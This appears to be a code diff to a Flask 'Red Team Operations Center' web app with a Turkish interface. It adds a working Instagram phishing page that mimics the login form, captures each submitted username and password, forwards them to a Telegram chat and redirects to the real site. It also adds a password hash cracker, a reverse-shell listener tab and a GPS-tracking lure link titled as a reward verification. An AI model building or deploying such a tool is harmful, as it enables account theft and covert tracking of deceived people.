@@ -9,6 +9,7 @@ import subprocess
 import re
 import csv
 import zipfile
+import hashlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from bs4 import BeautifulSoup
 from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
@@ -24,6 +25,7 @@ ADMIN_PASS = "toor1"
 
 SITE_DATABASE = []
 CLICK_LOGS = []
+CREDENTIAL_LOGS = []
 SCHEDULED_TARGETS = []
 NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
@@ -70,7 +72,6 @@ HTML_TEMPLATE = """
     <meta charset="UTF-8">
     <title>Kali Linux - Red Team Operations Center</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <!-- Leaflet CSS ve JS (Mini Harita için) -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -88,8 +89,8 @@ HTML_TEMPLATE = """
         .tab-content.active { display: block; }
         .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
         label { color: #38bdf8; font-size: 13px; font-weight: bold; }
-        input[type="text"], select, textarea, input[type="file"], input[type="number"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
-        input:focus, textarea:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
+        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
+        input:focus, textareaFocus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
         textarea { resize: vertical; height: 100px; }
         button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
         button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
@@ -117,8 +118,11 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure & GPS Tracker</button>
-            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram Test</button>
+            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
+            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS Tracker</button>
+            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
+            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
+            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
             <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
             <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
             <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
@@ -145,18 +149,43 @@ HTML_TEMPLATE = """
             <div id="results" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Instagram Phishing Sekmesi -->
+        <div id="phishTab" class="tab-content">
+            <h3>📸 Instagram Phishing & Credential Harvester</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak sahte Instagram giriş linkini kopyalayın. Şifreyi girenlerin bilgileri anında panele düşer.</p>
+            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
+            <button class="success" onclick="generateInstaLink()">Link Üret</button>
+            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
+            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
+        </div>
+
         <!-- Lure Link & Tracker Sekmesi -->
         <div id="lureTab" class="tab-content">
             <h3>🎯 Lure Link Generator & GPS/Device Tracker</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak takip linkini üretin. Ziyaretçi tıkladığında GPS konumu mini haritada 📍 işaretiyle gösterilir.</p>
             <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
             <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
-            <div class="form-group" style="margin-top: 20px;">
-                <label>Oluşturulan Takip Linki:</label>
-                <input type="text" id="generatedLink" readonly style="color: #38bdf8;">
-            </div>
+            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
             <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & GPS Logları:</h4>
             <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
+        </div>
+
+        <!-- Hash Cracker Sekmesi -->
+        <div id="crackerTab" class="tab-content">
+            <h3>🔑 Hash Cracker & Şifre Çözücü</h3>
+            <div class="form-group"><label>Hash Tipi:</label><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
+            <div class="form-group"><label>Hedef Hash:</label><input type="text" id="targetHash" placeholder="örn: 5d41402abc4b2a76b9719d911017c592"></div>
+            <div class="form-group"><label>Wordlist (Her satıra bir şifre):</label><textarea id="wordlistArea">admin\n123456\npassword\nroot1\ntoor1\nhello\nsecret\nkali</textarea></div>
+            <button class="danger" onclick="startHashCrack()">Hash Çözmeyi Başlat</button>
+            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
+        </div>
+
+        <!-- Shell Listener Sekmesi -->
+        <div id="shellListenerTab" class="tab-content">
+            <h3>💻 Reverse Shell Dinleyicisi (Multi-Handler)</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Sunucu üzerinde belirtilen portu dinlemeye alarak gelen reverse shell bağlantılarını yönetin.</p>
+            <div class="form-group"><label>Dinlenecek Port (LPORT):</label><input type="number" id="listenerPort" value="4444"></div>
+            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
+            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
         </div>
 
         <!-- Telegram Test Sekmesi -->
@@ -272,6 +301,21 @@ HTML_TEMPLATE = """
             event.target.classList.add('active');
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
             if(tabId === 'lureTab') loadClickLogs();
+            if(tabId === 'phishTab') loadCreds();
+        }
+        function generateInstaLink() {
+            document.getElementById('instaLink').value = window.location.origin + "/phish/instagram";
+            alert("Instagram phishing linki üretildi!");
+        }
+        async function loadCreds() {
+            let res = await fetch('/api/phish/creds');
+            let data = await res.json();
+            let container = document.getElementById('credsContainer');
+            if(data.creds.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p>"; return; }
+            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Kullanıcı Adı / E-Posta</th><th>Şifre</th></tr></thead><tbody>`;
+            data.creds.forEach(c => { html += `<tr><td>${c.time}</td><td><b>${c.ip}</b></td><td style="color:#38bdf8;">${c.username}</td><td style="color:#f87171;">${c.password}</td></tr>`; });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
         }
         function generatePayloads() {
             let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
@@ -295,8 +339,6 @@ HTML_TEMPLATE = """
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
-
-            // Tablo çizildikten sonra Leaflet haritalarını render et
             data.logs.forEach((l, index) => {
                 if(l.lat && l.lon) {
                     let mapId = `map_${index}`;
@@ -307,6 +349,27 @@ HTML_TEMPLATE = """
                     }, 100);
                 }
             });
+        }
+        async function startHashCrack() {
+            let type = document.getElementById('hashType').value;
+            let targetHash = document.getElementById('targetHash').value.trim();
+            let wordlist = document.getElementById('wordlistArea').value;
+            let resultsDiv = document.getElementById('crackResults');
+            if(!targetHash) { alert('Hash giriniz!'); return; }
+            resultsDiv.style.display = "block";
+            resultsDiv.innerHTML = "root@kali:~# Hash brute-force / cracking başlatıldı...";
+            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash: targetHash, wordlist}) });
+            let data = await res.json();
+            resultsDiv.innerHTML = data.output;
+        }
+        async function startListener() {
+            let port = document.getElementById('listenerPort').value;
+            let statusDiv = document.getElementById('listenerStatus');
+            statusDiv.style.display = "block";
+            statusDiv.innerHTML = `root@kali:~# nc -lvnp ${port} dinlemesi başlatılıyor...`;
+            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
+            let data = await res.json();
+            statusDiv.innerHTML = data.output;
         }
         async function sendTelegramTest() {
             let chatId = document.getElementById('testChatId').value.trim();
@@ -433,6 +496,96 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
+# --- INSTAGRAM PHISHING ROTE ---
+@app.route("/phish/instagram", methods=["GET", "POST"])
+def insta_phish():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
+        if NOTIFY_CHAT_ID and TOKEN:
+            try:
+                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
+                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
+            except: pass
+        return redirect("https://www.instagram.com")
+        
+    return """
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <title>Giriş • Instagram</title>
+        <style>
+            body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; border-radius: 1px; }
+            h1 { font-family: cursive; margin-bottom: 30px; font-size: 32px; font-weight: normal; }
+            input { width: 100%; padding: 10px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
+            input:focus { border-color: #a8a8a8; }
+            button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 14px; }
+            button:hover { background: #1877f2; }
+        </style>
+    </head>
+    <body>
+        <div class="login-card">
+            <h1>Instagram</h1>
+            <form method="POST">
+                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                <input type="password" name="password" placeholder="Şifre" required>
+                <button type="submit">Giriş Yap</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    """
+
+@app.route("/api/phish/creds")
+def api_phish_creds():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    return jsonify({"creds": CREDENTIAL_LOGS})
+
+# --- HASH CRACKER API ---
+@app.route("/api/crack-hash", methods=["POST"])
+def api_crack_hash():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    d = request.get_json()
+    htype = d.get("type")
+    target = d.get("hash").strip().lower()
+    wordlist = d.get("wordlist").split("\n")
+    
+    found = None
+    attempts = 0
+    for word in wordlist:
+        w = word.strip()
+        if not w: continue
+        attempts += 1
+        if htype == "md5":
+            h = hashlib.md5(w.encode()).hexdigest()
+        elif htype == "sha256":
+            h = hashlib.sha256(w.encode()).hexdigest()
+        else:
+            h = ""
+        if h == target:
+            found = w
+            break
+            
+    if found:
+        out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
+    else:
+        out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi, şifre wordlist içinde yok."
+    return jsonify({"output": out})
+
+# --- REVERSE SHELL LISTENER API ---
+@app.route("/api/listener/start", methods=["POST"])
+def api_listener_start():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    port = request.get_json().get("port", 4444)
+    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
+
+# --- GELİŞMİŞ LURE LINK VE GPS TRACKER ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
     return f"""
